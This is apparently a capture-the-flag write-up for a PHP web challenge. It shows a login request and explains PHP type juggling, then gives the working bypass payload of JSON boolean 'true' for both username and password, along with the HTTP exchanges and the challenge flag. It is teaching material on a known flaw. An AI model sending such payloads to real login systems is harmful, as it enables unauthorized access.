# Challenge Name: coercion


![date](https://img.shields.io/badge/date-26.02.2023-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-150-blue.svg)  


## Description

We've designed this web application to be a bit tricky, so see if you can find the flag hidden in our code. Good luck!

[https://ideh-coercion.chals.io](https://ideh-coercion.chals.io)

**Author** : c3p0d4y

## Detailed solution

Checking our web app 

![image](https://user-images.githubusercontent.com/72421091/221641857-45fb86fb-0385-4911-bb8f-ad5b08be4fae.png)

We have a login page with a script code for sending a post request to login.php using AJAX with username and password in a json format

```js
<script>
$(document).ready(function(){
    $("#result").hide();
    $('#login_submit').click(function()
    {
        var formData = JSON.stringify($("#login").serializeArray());
        $.ajax({
            type: "POST",
                url: "login.php",
                dataType: "json",
                data: '{"username": "' + $('#uname').val() + '", "password" : "' + $('#password').val() + '"}',
                contentType: 'application/json',
                cache:false,
                success : function(result) {
                        console.log(result);
                    $("#login-form").hide();
                    $("#result").show();
                    if(result.status === "success" ){
                        $('#message').html(result.message);
                        $('#message').addClass('alert alert-success');
                                                              } else {
                        $('#message').html(result.message);
                        $('#message').addClass('alert alert-danger');
                    }

                }
        });
        return false; 
    });
});
</script>
```
Quick check for login and response

```http
POST /login.php HTTP/1.1
Host: ideh-coercion.chals.io
Connection: close
Content-Length: 43
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/json
Origin: https://ideh-coercion.chals.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ideh-coercion.chals.io/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username": "admin", "password" : "admin"}
```

```http
HTTP/1.1 200 OK
Date: Mon, 27 Feb 2023 17:46:03 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Length: 61
Connection: close
Content-Type: text/html; charset=UTF-8

{"status": "error", "message":"Invalid username or password"}
```
We need to find a way to bypass login

Php coercion or type juggling deal badly when if you want to combine different data types together. It's has a known vulnerability called Php type juggling when loose comparisons "=="

More Details : 
- https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
- https://www.php.net/manual/en/language.types.type-juggling.php

![image](https://user-images.githubusercontent.com/72421091/221639083-1ff898ed-3f37-4d8d-859e-cd57c4b2d3a2.png)

When a string is being coerced to boolean it give as true 

```
"45X"   --> true      // not numeric string, fall back to bool
```

It's possible that our app has a test case for login with loose comparisons "==" and string values. 

Let's check what happens if we sent true for username and password

```http
POST /login.php HTTP/1.1
Host: ideh-coercion.chals.io
Connection: close
Content-Length: 37
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/json
Origin: https://ideh-coercion.chals.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ideh-coercion.chals.io/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username": true, "password" : true}
```

```http
HTTP/1.1 200 OK
Date: Mon, 27 Feb 2023 17:47:31 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 98
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":"success","message":"Successfully authenticated","flag":"IDEH{Type_Ju9G11ng_CH411En93}"}
```

We were able to bypass login check and get our flag


## Flag

```
IDEH{Type_Ju9G11ng_CH411En93}
```
